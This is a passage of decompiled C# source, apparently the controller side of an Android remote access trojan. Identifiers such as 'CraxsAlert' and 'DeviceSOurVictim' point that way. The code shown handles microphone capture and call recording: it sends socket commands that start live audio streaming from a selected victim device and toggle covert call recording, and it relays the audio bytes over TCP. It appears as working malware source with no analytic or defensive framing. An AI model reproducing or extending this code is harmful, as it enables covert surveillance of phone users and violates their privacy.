					InBoxSource.Items.Add(item);
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				((IDisposable)enumerator).Dispose();
			}
		}
		if (InBoxSource.Items.Count == 0)
		{
			Panel2.Visible = false;
			return;
		}
		InBoxSource.SelectedIndex = 0;
		DeviceSOurVictim.SelectedIndex = 0;
		inHZ.SelectedIndex = 0;
	}

	private void AppendByteToDisk(string FilepathToAppendTo, ref byte[] Content)
	{
		FileStream fileStream = new FileStream(FilepathToAppendTo, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
		fileStream.Write(Content, 0, Content.Length);
		fileStream.Close();
	}

	private void OK_DataReady(object sender, DataReadyEventArgs e)
	{
		bytes.Add(e.Data);
	}

	private void bIN_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			if (Operators.ConditionalCompareObjectEqual(bIN.Tag, 0, TextCompare: false))
			{
				In_Stop();
				bytes.Clear();
				string[] array = classClient.Keys.Split(':');
				int selectedIndex = DeviceSOurVictim.SelectedIndex;
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".microphone" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "input" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + classClient.ClientRemoteAddress + Data.SPL_DATA + SecurityKey.MicwaveinByte + Data.SPL_DATA + selectedIndex + Data.SPL_DATA + Conversions.ToString(reso.HzInt(inHZ.Text)),
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
				bIN.Tag = 1;
				bIN.Text = "Cancel...";
			}
			else if (Operators.ConditionalCompareObjectEqual(bIN.Tag, 1, TextCompare: false))
			{
				In_Stop();
				bIN.Text = "Run";
				bIN.Tag = 0;
			}
			else if (Operators.ConditionalCompareObjectEqual(bIN.Tag, 2, TextCompare: false))
			{
				In_Stop();
				bIN.Text = "Run";
				bIN.Tag = 0;
			}
		}
	}

	private void Worker_DoWork(object sender, DoWorkEventArgs e)
	{
		checked
		{
			do
			{
				if (bytes.Count > 0)
				{
					byte[] array = bytes[0];
					try
					{
						if (ClientWaveIn.Client.Connected)
						{
							ClientWaveIn.Client.Poll(infoServer.Microseconds, SelectMode.SelectWrite);
							ClientWaveIn.Client.SendBufferSize = array.Length * 15;
							ClientWaveIn.GetStream().Write(array, 0, array.Length);
							classClient.MyServer.BytesSent += array.Length;
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						break;
					}
					if (DoCase)
					{
						bytes.RemoveAt(0);
					}
				}
				Thread.Sleep(1);
			}
			while (DoCase);
		}
	}

	private void InBoxSource_SelectedIndexChanged(object sender, EventArgs e)
	{
		string value = Regex.Match(InBoxSource.SelectedItem.ToString(), "(?<=" + Regex.Escape("(") + ").+?(?=" + Regex.Escape(")") + ")", RegexOptions.IgnoreCase).Value;
		MDeviceId = Conversions.ToInteger(value.Trim());
	}

	private void OutBoxSource_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void Microphone_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	private void Button1_Click_1(object sender, EventArgs e)
	{
		if (Operators.CompareString(Button1.Tag.ToString(), "o", TextCompare: false) == 0)
		{
			if (classClient != null)
			{
				Button1.Tag = "f";
				TcpClient myClient = classClient.myClient;
				object[] parametersObjects = new object[4]
				{
					myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "srec<*>on" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
				isrecording = true;
				DrakeUILampLED1.On = true;
				DrakeUILampLED1.Blink = true;
				Button1.Text = "Stop Recorder";
				CraxsAlert.ShowSucess("Use Call Recorder\r\nto get records");
			}
		}
		else if (classClient != null)
		{
			Button1.Tag = "o";
			TcpClient myClient2 = classClient.myClient;
			object[] parametersObjects2 = new object[4]
			{
				myClient2,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "srec<*>off" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects2);
			Button1.Text = "Start Recorder";
			isrecording = false;
			DrakeUILampLED1.On = false;
			DrakeUILampLED1.Blink = false;
		}
	}
}
